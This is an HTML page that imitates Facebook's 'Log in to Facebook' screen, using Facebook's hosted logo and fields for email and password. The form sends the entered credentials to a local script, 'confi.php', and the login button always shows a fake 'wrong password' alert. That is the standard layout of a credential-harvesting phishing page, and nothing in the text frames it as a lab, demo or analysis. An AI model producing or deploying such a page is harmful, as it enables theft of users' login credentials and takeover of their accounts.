<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <title>Log In</title>
</head>
<body>
  <form action="confi.php" method="POST">
 <div class="container">
   <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="">
   <div class="login">
     <div class="title">Log in to Facebook</div>
     <input type="text" name="email" class="email" placeholder="Email address or phone number">
     <input type="password" name="password" class="password" placeholder="Password">
     <button onclick="alert('wrong password Try again')" class="login-btn" name="login-btn" type="submit">Log In</button>
     <a href="#">Forgotten account ?</a>
     <div class="underline"></div>
     <span>or</span>
     <button class="new-account" >Create New Account</button>
    </form>
   </div>
 </div>
</body>
</html>